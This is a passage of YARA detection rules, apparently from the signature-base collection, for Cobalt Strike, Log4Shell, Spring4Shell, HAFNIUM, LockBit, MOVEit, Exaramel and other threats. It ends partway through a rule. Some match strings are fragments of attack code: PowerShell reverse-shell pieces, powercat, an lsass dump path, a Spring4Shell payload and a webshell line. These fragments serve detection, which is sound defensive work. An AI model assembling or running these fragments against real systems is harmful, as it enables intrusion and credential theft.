		logic_hash = "db4b7be2bafe29b5e7c81a90e17a660cf73cff1c2e8edd04a9421daba09e3e0e"
		score = 75
		quality = 85
		tags = ""
		hash1 = "624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8"

	strings:
		$ = "SOFTWARE\\WOW6432Node\\Microsoft\\config_" ascii
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\windefenders" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Irontiger_Wmiexec
{
	meta:
		description = "Iron Tiger Tool - wmi.vbs detection"
		author = "Cyber Safety Solutions, Trend Micro"
		id = "a3060f50-3594-5da9-98e2-6fa0087451f5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/T5fSJC"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_irontiger_trendmicro.yar#L259-L276"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7988b993345e13b64e5f02ecd2679fc484b063a4cd2f18b52d00d2dfa34d82cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str1 = "Temp Result File , Change it to where you like" wide ascii
		$str2 = "wmiexec" wide ascii
		$str3 = "By. Twi1ight" wide ascii
		$str4 = "[both mode] ,delay TIME to read result" wide ascii
		$str5 = "such as nc.exe or Trojan" wide ascii
		$str6 = "+++shell mode+++" wide ascii
		$str7 = "win2008 fso has no privilege to delete file" wide ascii

	condition:
		2 of ( $str* )
}

rule SIGNATURE_BASE_HKTL_Redmimicry_Agent
{
	meta:
		description = "matches the RedMimicry agent executable and payload"
		author = "mirar@chaosmail.org"
		id = "a4d4ec77-4a0d-5afd-9181-85433e8b5fda"
		date = "2020-06-22"
		modified = "2023-01-06"
		reference = "https://redmimicry.com"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_redmimicry.yar#L2-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "645da2764ca911c4aae80b90622d2c61933dee929403858fc49f7bc0d44300c6"
		score = 75
		quality = 85
		tags = ""
		sharing = "tlp:white"

	strings:
		$reg0 = "HKEY_CURRENT_USER\\" ascii
		$reg1 = "HKEY_LOCAL_MACHINE\\" ascii
		$reg2 = "HKEY_CURRENT_CONFIG\\" ascii
		$reg3 = "HKEY_CLASSES_ROOT\\" ascii
		$cmd0 = "C:\\Windows\\System32\\cmd.exe" ascii fullword
		$lua0 = "client_recv" ascii fullword
		$lua1 = "client_send" ascii fullword
		$lua2 = "$LuaVersion: " ascii
		$sym0 = "VirtualAllocEx" wide fullword
		$sym1 = "kernel32.dll" wide fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Cobaltstrike_Unmodifed_Beacon
{
	meta:
		description = "Detects unmodified CobaltStrike beacon DLL"
		author = "yara@s3c.za.net"
		id = "8eeb03f9-9698-5a46-b45b-224d5c3f3df7"
		date = "2019-08-16"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike_evasive.yar#L309-L320"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "10114a431fb70be8e18e67b22aa76bf2c0536f07d373f717c1dc51755e0847c9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$loader_export = "ReflectiveLoader"
		$exportname = "beacon.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_Strings
{
	meta:
		description = "Identifies strings used in Cobalt Strike Beacon DLL"
		author = "Elastic"
		id = "af558aa2-a3dc-5a7a-bc74-42bb2246091c"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike.yar#L54-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "4349a7ad94df2269217b55c2aef9628c4eef078566c276936accdd4f996ba2cf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "%02d/%02d/%02d %02d:%02d:%02d"
		$s2 = "Started service %s on %s"
		$s3 = "%s as %s\\%s: %d"

	condition:
		2 of them
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_XOR_Strings
{
	meta:
		description = "Identifies XOR'd strings used in Cobalt Strike Beacon DLL"
		author = "Elastic"
		id = "359160a8-cf1c-58a8-bf7f-c09a8d661308"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike.yar#L69-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b5009c29055784ce6371100417b862f723d7e3c1b4081c563fcd8770db48051f"
		score = 75
		quality = 85
		tags = ""
		xor_s1 = "%02d/%02d/%02d %02d:%02d:%02d"
		xor_s2 = "Started service %s on %s"
		xor_s3 = "%s as %s\\%s: %d"

	strings:
		$s1 = "%02d/%02d/%02d %02d:%02d:%02d" xor(0x01-0xff)
		$s2 = "Started service %s on %s" xor(0x01-0xff)
		$s3 = "%s as %s\\%s: %d" xor(0x01-0xff)
		$fp1 = "MalwareRemovalTool"

	condition:
		2 of ( $s* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1
{
	meta:
		description = "Detects indicator (event name) found in samples related to 3CX compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "b233846a-19df-579b-a674-233d66824008"
		date = "2023-03-30"
		modified = "2023-12-05"
		reference = "https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_mal_3cx_compromise_mar23.yar#L216-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6ab8a4ac184eaba6eb56bfc49d6fa03f9b0877d75294aa9a242e9ac96482fab0"
		score = 70
		quality = 85
		tags = ""
		hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
		hash2 = "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983"
		hash3 = "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868"
		hash4 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"

	strings:
		$a1 = "AVMonitorRefreshEvent" wide fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_EXPL_Manageengine_CVE_2022_47966_Jan23_1
{
	meta:
		description = "Detects indicators of exploitation of ManageEngine vulnerability as described by Horizon3"
		author = "Florian Roth (Nextron Systems)"
		id = "07535b9c-8611-5a46-bcd7-f94070de2aea"
		date = "2023-01-13"
		modified = "2023-12-05"
		reference = "https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_manageengine_jan23.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a62064e4f12632ba6c14cbbd9369ee919536334f19021a177c126b5dff7e568c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "]: com.adventnet.authentication.saml.SamlException: Signature validation failed. SAML Response rejected|"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Jdniexploit_Error_Indicators_Dec21_1
{
	meta:
		description = "Detects error messages related to JDNI usage in log files that can indicate a Log4Shell / Log4j exploitation"
		author = "Florian Roth (Nextron Systems)"
		id = "68bcf043-58b4-54a9-b024-64871b5d535f"
		date = "2021-12-10"
		modified = "2023-06-23"
		reference = "https://twitter.com/marcioalm/status/1470361495405875200?s=20"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_log4j_cve_2021_44228.yar#L213-L226"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2ab98814b2ed66b0bda875fecc0b09db82035d7edcdb0af65f815817ec8c6cc8"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "FATAL log4j - Message: BadAttributeValueException: "

	condition:
		1 of them
}

rule SIGNATURE_BASE_EXPL_POC_Springcore_0Day_Indicators_Mar22_1
{
	meta:
		description = "Detects indicators found after SpringCore exploitation attempts and in the POC script"
		author = "Florian Roth (Nextron Systems)"
		id = "297e4b57-f831-56e0-a391-1ffbc9a4d438"
		date = "2022-03-30"
		modified = "2023-12-05"
		reference = "https://twitter.com/vxunderground/status/1509170582469943303"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_spring4shell.yar#L19-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "39fb62ec7953dae0a88e39e73e3ff286fc19cb8f21f8feb869a1875f6ba70cfb"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di"
		$x2 = "?pwd=j&cmd=whoami"
		$x3 = ".getParameter(%22pwd%22)"
		$x4 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Email_Redirection_Spoofing_Feb25
{
	meta:
		description = "Detects redirect spoofing in embedded URLs. This technique is used by threat actors to obscure the actual destination of a link"
		author = "Jonathan Peters (cod3nym)"
		id = "bf3a2b06-4dc5-5f0f-bf1f-2bd6a1cc4a8d"
		date = "2025-02-20"
		modified = "2025-03-20"
		reference = "https://any.run/cybersecurity-blog/cyber-attacks-january-2025/#fake-youtube-links-redirect-users-to-phishing-pages-11298"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/susp_email_redirection_spoofing.yar#L1-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9b196220b369c199a7e4d57cb5db18b32eb2565a6f9190929c5c01ac4fa04ac8"
		hash = "c4eb35c1a1c10226bff9bb0c88ca516441208d193b4994eeb292a66e53a2cc04"
		hash = "e3b8ea03a472348814c6ac81088234836e627a1878ec36e46ce62526e1390935"
		logic_hash = "9a411317821751dc0873fe3163791115d1e19bc4d57119ed2ba513b444864032"
		score = 70
		quality = 85
		tags = ""

	strings:
		$sa1 = "Content-Transfer-Encoding:" ascii
		$sa2 = "Subject:" ascii
		$x = ".com%20%20%20%20%20%" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Cobaltgang_PDF_Metadata_Rev_A
{
	meta:
		description = "Find documents saved from the same potential Cobalt Gang PDF template"
		author = "Palo Alto Networks Unit 42"
		id = "bcf5bf6e-c786-5f78-bf58-e0631a17e62e"
		date = "2018-10-25"
		modified = "2023-12-05"
		reference = "https://researchcenter.paloaltonetworks.com/2018/10/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/crime_cobalt_gang_pdf.yar#L1-L12"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8020ccff761b49d98e18cd5cb3c0695956a88e86a0958bfba1a19b7e3e629bb9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "<xmpMM:DocumentID>uuid:31ac3688-619c-4fd4-8e3f-e59d0354a338" ascii wide

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_HAFNIUM_Forensic_Artefacts_Mar21_1
{
	meta:
		description = "Detects forensic artefacts found in HAFNIUM intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "872822b0-34d9-5ae4-a532-6a8786494fa9"
		date = "2021-03-02"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_hafnium.yar#L35-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "eb86595956092506c2e29373faaf39a3987f9feed36a53b191bedd498db05cbb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "lsass.exe C:\\windows\\temp\\lsass" ascii wide fullword
		$s2 = "c:\\ProgramData\\it.zip" ascii wide fullword
		$s3 = "powercat.ps1'); powercat -c" ascii wide fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_HKTL_Nishang_PS1_Invoke_Powershelltcponeline
{
	meta:
		description = "Detects PowerShell Oneliner in Nishang's repository"
		author = "Florian Roth (Nextron Systems)"
		id = "0218ebbd-2dbe-5838-ab53-1e78e3f97b9e"
		date = "2021-03-03"
		modified = "2023-12-05"
		reference = "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_hafnium.yar#L105-L119"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "59622bff95de1077d26ee4547f37cd1045c0c1fc6817df40ff2564b33a962a07"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32"

	strings:
		$s1 = "=([text.encoding]::ASCII).GetBytes((iex $" ascii wide
		$s2 = ".GetStream();[byte[]]$" ascii wide
		$s3 = "New-Object Net.Sockets.TCPClient('" ascii wide

	condition:
		all of them
}

rule SIGNATURE_BASE_WEBSHELL_Proxyshell_Exploitation_Nov21_1
{
	meta:
		description = "Detects webshells dropped by DropHell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "300eaadf-db0c-5591-84fc-abdf7cdd90c1"
		date = "2021-11-01"
		modified = "2025-03-21"
		reference = "https://www.deepinstinct.com/blog/do-not-exchange-it-has-a-shell-inside"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_proxyshell.yar#L252-L266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d9812d3f53c346c4e318609e0c7de66811b27ffa7528a6ddeb6ac8436da59ef5"
		score = 85
		quality = 85
		tags = ""

	strings:
		$s01 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request[" ascii wide
		$s02 = "new System.IO.MemoryStream()" ascii wide
		$s03 = "Transform(" ascii wide

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Apr23_1
{
	meta:
		description = "Detects indicators found in LockBit ransomware"
		author = "Florian Roth"
		id = "75dc8b95-16f0-5170-a7d6-fc10bb778348"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_lockbit_lnx_macos_apr23.yar#L43-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "cd5bffa5571abfd1446b065d26c8c23f00fe1376d505af539c6f37356014a86f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$xe1 = "-i '/path/to/crypt'" xor
		$xe2 = "http://lockbit" xor
		$s1 = "idelayinmin" ascii
		$s2 = "bVMDKmode" ascii
		$s3 = "bSelfRemove" ascii
		$s4 = "iSpotMaximum" ascii
		$fp1 = "<html"

	condition:
		(1 of ( $x* ) or 4 of them ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Locker_LOG_Apr23_1
{
	meta:
		description = "Detects indicators found in LockBit ransomware log files"
		author = "Florian Roth"
		id = "aa0a2393-e5a2-5151-8afb-91a9bb922179"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_lockbit_lnx_macos_apr23.yar#L69-L84"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d5f96e601150209382d3f6458863bc79768beb99b587aa8d9ba37cb2c11ef634"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " is encrypted. Checksum after encryption "
		$s2 = "~~~~~Hardware~~~~"
		$s3 = "[+] Add directory to encrypt:"
		$s4 = "][+] Launch parameters: "

	condition:
		2 of them
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_1
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "a7c521b8-c654-51dd-9d5b-4ba883feffe3"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L43-L56"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "26674d8dea5cb2e95e442c4c75d80ca610f7373f0b216c0b1c83a5b1f9f70316"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "POST /moveitisapi/moveitisapi.dll action=m2 " ascii
		$x2 = " GET /human2.aspx - 443 " ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_2
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "1527f5e3-071d-5152-9452-9c4472d258f2"
		date = "2023-06-03"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L58-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "56328d078801a702ad47f01f356df6f00be8da593d03c549e77312af9b47b5be"
		score = 70
		quality = 85
		tags = ""

	strings:
		$a1 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.102+Safari/537.36" ascii
		$a2 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.54+Safari/537.36" ascii
		$s1 = " POST /moveitisapi/moveitisapi.dll" ascii
		$s2 = " POST /guestaccess.aspx"
		$s3 = " POST /api/v1/folders/"
		$s4 = "/files uploadType=resumable&"
		$s5 = " action=m2 "

	condition:
		1 of ( $a* ) and 3 of ( $s* ) or all of ( $s* )
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_3
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit DMZ Web API logs"
		author = "Nasreddine Bencherchali"
		id = "113a501f-d9ed-51fd-82cd-ccb6f02833bd"
		date = "2023-06-13"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L81-L94"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2eaa06c31687c6368f036a705fdc1b1c42355f19c098ae764a998039cc4aebb5"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "TargetInvocationException" ascii
		$s2 = "MOVEit.DMZ.Application.Folders.ResumableUploadFilePartHandler.DeserializeFileUploadStream" ascii

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Ziparchivefile
{
	meta:
		description = "Detects an archive file created by P.A.S. for download operation"
		author = "FR/ANSSI/SDO (modified by Florian Roth)"
		id = "081cc65b-e51c-59fc-a518-cd986e8ee2f7"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L30-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c15e7022f45ec211ba635d6cd31bab16f4fb0d3038fb19d5765e0f751c14a826"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "Archive created by P.A.S. v."

	condition:
		$s1
}

rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Sqldumpfile
{
	meta:
		description = "Detects SQL dump file created by P.A.S. webshell"
		author = "FR/ANSSI/SDO"
		id = "4c26feeb-3031-5c91-9eeb-4b5fe9702e39"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L64-L76"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c34abcada22fdf462fd66cc2da18ab9e54215defc6f7a7a95b5a80d1155a2ffe"
		score = 90
		quality = 85
		tags = ""

	strings:
		$ = "-- [ SQL Dump created by P.A.S. ] --"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_Key
{
	meta:
		description = "Detects the encryption key for the configuration file used by Exaramel malware as seen in sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "8078de62-3dd2-5ee0-8bda-f508e4013144"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L78-L90"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "056503a2c240a641cd2292a30ab1090e3a358cb4d57dca83b836ecb1bc62ed6b"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "odhyrfjcnfkdtslt"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_Name_Encrypted
{
	meta:
		description = "Detects the specific name of the configuration file in Exaramel malware as seen in sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "1c06f5fc-3435-51cd-92fb-17a4ab6b63ad"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L92-L104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f65d59381403534a2c2f39d66c7c62bf1540eafc9aad1ad73de1809e91c42446"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "configtx.json"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Socket_Path
{
	meta:
		description = "Detects path of the unix socket created to prevent concurrent executions in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "3aab84c9-9748-5d11-9cd7-efa9151036cf"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L134-L146"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8c049b5a7b508ca0f160d166f3c726e4a23a2c5b3105d075d7bf7a301a1c58f6"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "/tmp/.applocktx"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Task_Names
{
	meta:
		description = "Detects names of the tasks received from the CC server in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "185f2f3b-bf5c-54af-bca2-400d08bf9c91"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L148-L167"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "193482da1e2b9509fa9c65d46edc56057f7b5d44b7408d918d4a9cbb60736dab"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "App.Delete"
		$ = "App.SetServer"
		$ = "App.SetProxy"
		$ = "App.SetTimeout"
		$ = "App.Update"
		$ = "IO.ReadFile"
		$ = "IO.WriteFile"
		$ = "OS.ShellExecute"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Strings_Typo
{
	meta:
		description = "Detects misc strings in Exaramel malware with typos"
		author = "FR/ANSSI/SDO"
		id = "fdc79b87-eb9e-5751-9474-ff653b073165"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L187-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "65e6de743eb9fc742674c7e54eef8a376963a6fd4380bacd03fe6f92d4235920"
		score = 80
		quality = 85
		tags = ""

	strings:
		$typo1 = "/sbin/init | awk "
		$typo2 = "Syslog service for monitoring \n"
		$typo3 = "Error.Can't update app! Not enough update archive."
		$typo4 = ":\"metod\""

	condition:
		3 of ( $typo* )
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Strings
{
	meta:
		description = "Detects Strings used by Exaramel malware"
		author = "FR/ANSSI/SDO (composed from 4 saparate rules by Florian Roth)"
		id = "fdc79b87-eb9e-5751-9474-ff653b073165"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L204-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9d2790e60184ed973b2735263d0a997f32af0beacc9ea8ef65926fe6507011d5"
		score = 80
		quality = 85
		tags = ""

	strings:
		$persistence1 = "systemd"
		$persistence2 = "upstart"
		$persistence3 = "systemV"
		$persistence4 = "freebsd rc"
		$report1 = "systemdupdate.rep"
		$report2 = "upstartupdate.rep"
		$report3 = "remove.rep"
		$url1 = "/tasks.get/"
		$url2 = "/time.get/"
		$url3 = "/time.set"
		$url4 = "/tasks.report"
		$url5 = "/attachment.get/"
		$url6 = "/auth/app"

	condition:
		(5 of ( $url* ) and all of ( $persistence* ) ) or ( all of ( $persistence* ) and all of ( $report* ) ) or ( 5 of ( $url* ) and all of ( $report* ) )
}

rule SIGNATURE_BASE_LOG_EXPL_SUSP_Teamcity_Oct23_1
{
	meta:
		description = "Detects log entries that could indicate a successful exploitation of TeamCity servers"
		author = "Florian Roth"
		id = "4845b40a-cf77-53ae-b2fa-d1ed861153f2"
		date = "2023-10-02"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_teamcity_2023_42793.yar#L20-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a2f0abffb9c72e6b32875310e5af7365b6cab4e6c4f6188daa3085b57c38ed0e"
		score = 70
		quality = 85
		tags = ""

	strings:
